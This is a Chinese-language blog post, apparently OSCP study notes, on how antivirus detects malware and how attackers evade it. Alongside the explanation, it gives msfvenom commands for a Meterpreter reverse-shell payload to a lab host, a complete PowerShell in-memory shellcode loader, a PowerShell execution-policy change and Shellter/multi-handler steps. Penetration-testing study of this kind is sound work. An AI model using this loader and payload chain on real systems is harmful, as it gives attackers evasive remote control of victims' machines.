@@ -1,0 +1,833 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://avatars.githubusercontent.com/u/62293120?v=4">
+  <link rel="icon" href="https://avatars.githubusercontent.com/u/62293120?v=4">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="C47Sh4rk">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="如何免杀, 基础免杀思路">
+<meta property="og:type" content="article">
+<meta property="og:title" content="规避杀毒软件">
+<meta property="og:url" content="https://c47sh4rk.github.io/2022/08/17/%E8%A7%84%E9%81%BF%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6/index.html">
+<meta property="og:site_name" content="C47Sh4rk&#39;s Blog">
+<meta property="og:description" content="如何免杀, 基础免杀思路">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220817194518.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818011427.png">
+<meta property="article:published_time" content="2022-08-17T11:32:26.000Z">
+<meta property="article:modified_time" content="2023-02-26T08:05:47.000Z">
+<meta property="article:author" content="C47Sh4rk">
+<meta property="article:tag" content="OSCP">
+<meta property="article:tag" content="免杀">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220817194518.png">
+  
+  
+  
+  <title>规避杀毒软件 - C47Sh4rk&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"c47sh4rk.github.io","root":"/","version":"1.9.1","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>C47Sh4rk&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/0%20(2).png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="规避杀毒软件"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-08-17 19:32" pubdate>
+          2022年8月17日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          30 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">规避杀毒软件</h1>
+            
+            <div class="markdown-body">
+              
+              <h3 id="防病毒软件"><a href="#防病毒软件" class="headerlink" title="防病毒软件"></a>防病毒软件</h3><ul>
+<li>规避防病毒软件是后渗透测试阶段的重要步骤</li>
+<li>最初防病毒软件只用于查杀计算机病毒软件</li>
+<li>现在AV产品包含FW、WEB站点扫描等能力</li>
+<li>绝对的免杀是耗时且很难长期实现的(AV软件厂商在不断变化)</li>
+</ul>
+<h2 id="AV检测技术"><a href="#AV检测技术" class="headerlink" title="AV检测技术"></a>AV检测技术</h2><h3 id="防病毒检测方法"><a href="#防病毒检测方法" class="headerlink" title="防病毒检测方法"></a>防病毒检测方法</h3><ul>
+<li>PE: Protable Executable 包含可执行文件和对象文件。PE文件使用一个Windows数据结构, 详细对应Windows加载器执行代码、引用库、导入和导出API表等具体信息</li>
+<li>生成测试文件<ul>
+<li><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f exe &gt; binary.exe</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220817194518.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+</li>
+</ul>
+<h3 id="防病毒厂商的检测方法"><a href="#防病毒厂商的检测方法" class="headerlink" title="防病毒厂商的检测方法"></a>防病毒厂商的检测方法</h3><ul>
+<li>基于字符特征的检测方法<ul>
+<li>特征码是恶意软件中唯一的一组连续的字节序列, 相当于黑名单机制</li>
+<li>修改(修改一组无害的字符–修改大小写)或混淆特征码可以绕过AV软件的检测</li>
+<li>AV厂商经常更新特征码, 而且不同厂商的特征码也不尽相同, 因此很难找到通用的免杀方法</li>
+</ul>
+</li>
+<li>启发式检测方法<ul>
+<li>依赖于各种规则和算法来确定一个动作是否是恶意的</li>
+<li>通常通过单步跟踪程序运行, 或反编译分析源码来实现检测, 寻找各种恶意的模式和调用行为</li>
+</ul>
+</li>
+<li>基于行为的检测方法<ul>
+<li>动态分析程序的行为, 在模拟环境中执行程序(虚拟机), 查找恶意的行为和动作</li>
+</ul>
+</li>
+<li>以上两种方法不基于特征字符, 因此一定程度可发现未知病毒<ul>
+<li>大部分杀毒软件都会综合使用以上方法</li>
+</ul>
+</li>
+</ul>
+<h2 id="AV躲避技术"><a href="#AV躲避技术" class="headerlink" title="AV躲避技术"></a>AV躲避技术</h2><h3 id="AV躲避技术-1"><a href="#AV躲避技术-1" class="headerlink" title="AV躲避技术"></a>AV躲避技术</h3><ul>
+<li>AV躲避技术分为两大类<ul>
+<li>磁盘中(修改存储在硬盘中的文件)</li>
+<li>内存中(现在恶意软件主要食用方法)<h3 id="磁盘中躲避技术-修改、混淆磁盘中的文件"><a href="#磁盘中躲避技术-修改、混淆磁盘中的文件" class="headerlink" title="磁盘中躲避技术(修改、混淆磁盘中的文件)"></a>磁盘中躲避技术(修改、混淆磁盘中的文件)</h3></li>
+</ul>
+</li>
+<li>打包: 打包后体积更小、特征码不同, 单一使用此方法, 不足以规避目前主流AV软件的查杀</li>
+<li>混淆: 最初用于软件开发者保护自己的知识产权。花指令 重组 变异代码 语义等价替换 分隔和重排序函数, 增加逆向分析难度, 对于基于特征码的检测方法比较有效</li>
+<li>加密Cyberers: 加密软件, 增加解密存根, 执行时在内存中解密执行代码, 磁盘中只有加密的文件。改变了可执行代码, 作为最有效的反病毒规避技术之一, 加密已经成为现代恶意软件的基础</li>
+<li>软件保护: 结合以上方法, 同时增加反逆向、反调试、虚拟机检测等技术。即用于软件保护, 也可用于AV规避, 由于相关技术太复杂, 目前没有开源AV规避产品, 商业工具The Enigma Protector</li>
+</ul>
+<h3 id="内存中躲避技术"><a href="#内存中躲避技术" class="headerlink" title="内存中躲避技术"></a>内存中躲避技术</h3><ul>
+<li><p>内存中注入也叫PE Injection, 是目前主流的AV躲避技术</p>
+</li>
+<li><p>优点是不向硬盘写文件(AV软件重点关注)</p>
+</li>
+<li><p>需要独立编写代码实现内存注入</p>
+</li>
+<li><p>远程进程内存注入技术</p>
+<ul>
+<li>利用Windows API, 向正常PE进程注入恶意代码</li>
+<li>首先通过OpenProcess函数获得可用的有权访问的HANDLE</li>
+<li>获得 HANDLE 后, 在该进程的上下文中分配内存, 调用诸如 VirtualAllocEx 之类的 Windows API</li>
+<li>使用WriteProcessMemory等函数将恶意代码注入新分派的内存中</li>
+<li>通过CreateRemoteThread API 在新内存中执行恶意代码</li>
+</ul>
+</li>
+<li><p>反射DLL注入技术</p>
+<ul>
+<li>传统DLL注入通过LoadLibrary API从硬盘中加载恶意DLL文件</li>
+<li>高级用法加载存储在进程内存中的DLL</li>
+<li>LoadLibrary不支持从内存加载DLL, Windows也未公开任何可以实现内存中加载DLL的方法</li>
+<li>使用这种方法的攻击者, 必须自己开发API</li>
+</ul>
+</li>
+<li><p>进程挖空技术(Process Hollowing)</p>
+<ul>
+<li>攻击者首先在挂起状态下启动一个非恶意进程</li>
+<li>从内存中删除进程的映像, 并替换为恶意程序映像</li>
+<li>然后恢复进程, 并执行恶意代码, 而不是合法进程</li>
+</ul>
+</li>
+<li><p>内连挂载技术(Inline Hooking)</p>
+<ul>
+<li>修改内存并在函数中引入一个钩子(重定向代码执行的指令) 来将执行流指向我们的恶意代码</li>
+<li>执行恶意代码后, 流将返回到之前的函数并技术执行, 看起来就像只执行了原始代码代码一样</li>
+</ul>
+</li>
+</ul>
+<h3 id="AV躲避实例"><a href="#AV躲避实例" class="headerlink" title="AV躲避实例"></a>AV躲避实例</h3><ul>
+<li><p>PowerShell内存中注入</p>
+<ul>
+<li>使用类似于远程进程注入的方法, 将恶意代码注入到powershell当前进程</li>
+<li>Powershell调用Windows API, 因此可实现内存中注入进程</li>
+<li>注入的脚本代码在Powershell进程中执行程序</li>
+<li>与执行程序相比, PS脚本不容易被查杀(AV软件经常通过变量名、注释和逻辑检测脚本)</li>
+</ul>
+</li>
+<li><p>代码思路</p>
+<ol>
+<li>该脚本首先从 kernel32.dll 导入 VirtualAlloc 和 CreateThread 以及从 msvcrt.dll 导入 memset。这些函数将允许我们分别分配内存、创建执行线程以及将任意数据写入分配的内存</li>
+<li>在当前进程(powershell.exe)中分配内存, 并执行一个新线程</li>
+<li>使用VirtualAlloc分配内存空间, 并将payload的每个字节存储在$sc字节阵列中</li>
+<li>使用memset将payload写入到新分配的内存中</li>
+<li>最后使用CreateThread, 在单独的线程中执行payload</li>
+</ol>
+</li>
+</ul>
+<figure class="highlight ps1"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs ps1"><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">[DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="hljs-string">public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocat</span><br><span class="hljs-string">ionType, uint flProtect);</span><br><span class="hljs-string"></span><br><span class="hljs-string">[DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="hljs-string">public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);</span><br><span class="hljs-string"></span><br><span class="hljs-string">[DllImport(&quot;msvcrt.dll&quot;)]</span><br><span class="hljs-string">public static extern IntPtr memset(IntPtr dest, uint src, uint count);&#x27;</span>;<br><br><span class="hljs-variable">$winFunc</span> =<br>  <span class="hljs-built_in">Add-Type</span> <span class="hljs-literal">-memberDefinition</span> <span class="hljs-variable">$code</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;Win32&quot;</span> <span class="hljs-literal">-namespace</span> Win32Functions <span class="hljs-literal">-passthru</span>;<br><br>[<span class="hljs-built_in">Byte</span>[]];<br>[<span class="hljs-built_in">Byte</span>[]]<span class="hljs-variable">$sc</span> = &lt;place your shellcode here&gt;;<br><br><span class="hljs-variable">$size</span> = <span class="hljs-number">0</span>x1000;<br><br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$sc</span>.Length <span class="hljs-operator">-gt</span> <span class="hljs-number">0</span>x1000) &#123;<span class="hljs-variable">$size</span> = <span class="hljs-variable">$sc</span>.Length&#125;;<br><br><span class="hljs-variable">$x</span> = <span class="hljs-variable">$winFunc::VirtualAlloc</span>(<span class="hljs-number">0</span>,<span class="hljs-variable">$size</span>,<span class="hljs-number">0</span>x3000,<span class="hljs-number">0</span>x40);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span> <span class="hljs-operator">-le</span> (<span class="hljs-variable">$sc</span>.Length<span class="hljs-literal">-1</span>);<span class="hljs-variable">$i</span>++) &#123;<span class="hljs-variable">$winFunc::memset</span>([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>](<span class="hljs-variable">$x</span>.ToInt32()+<span class="hljs-variable">$i</span>), <span class="hljs-variable">$sc</span> [<span class="hljs-variable">$i</span>], <span class="hljs-number">1</span>)&#125;;<br><br><span class="hljs-variable">$winFunc::CreateThread</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$x</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<span class="hljs-keyword">for</span> (;;) &#123; <span class="hljs-built_in">Start-sleep</span> <span class="hljs-number">60</span> &#125;;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>生成payload<ul>
+<li><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f powershell</code></li>
+<li>将生产的$buf变量的值写入到脚本的$sc变量中</li>
+<li>修改powershell执行策略<ul>
+<li><code>PS C:\Users\offsec\Desktop&gt; Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope C urrentUser</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="Shellter"><a href="#Shellter" class="headerlink" title="Shellter"></a>Shellter</h2><h3 id="Shellter-1"><a href="#Shellter-1" class="headerlink" title="Shellter"></a>Shellter</h3><ul>
+<li><p>最流行的免费动态shellcode注入工具之一, 能够一定程度绕过杀毒软件</p>
+<ul>
+<li>对PE文件进行深入分析, 将payload注入到另一个正常文件之中</li>
+<li>改变PE文件的Section权限, 并创建新的Section</li>
+<li>使用现有的PE Import Address Table(IAT)条目来定位将用于内存分配、传输和执行负载的函数</li>
+</ul>
+</li>
+<li><p>一个windows程序, 可以使用wine在kali上运行<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818011427.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>shellter支持自动(A)和手动(M)执行方式</p>
+<ul>
+<li>手动模式总, shellter会生成注入的代码, 也可定制</li>
+</ul>
+</li>
+<li><p>指定注入的目标程序, 进行注入(注入前备份源文件)</p>
+<ul>
+<li>选择Stealth Mode, 以便执行注入代码后回复原执行流</li>
+</ul>
+</li>
+<li><p>使用注入定制payload</p>
+</li>
+<li><p>持久化, 避免正常程序执行完成后, shell也终端</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> AutoRunScript post/windows/manage/migrate<br>AutoRunScript =&gt; post/windows/manage/migrate<br>msf exploit(multi/handler) &gt; exploit<br></code></pre></td></tr></table></figure></li>
+</ul>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/OSCP-Notes/" class="category-chain-item">OSCP-Notes</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/OSCP/">#OSCP</a>
+      
+        <a href="/tags/%E5%85%8D%E6%9D%80/">#免杀</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>规避杀毒软件</div>
+      <div>https://c47sh4rk.github.io/2022/08/17/规避杀毒软件/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>C47Sh4rk</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年8月17日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/08/18/%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/" title="本地提权">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">本地提权</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/08/17/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/" title="文件传输">
+                        <span class="hidden-mobile">文件传输</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
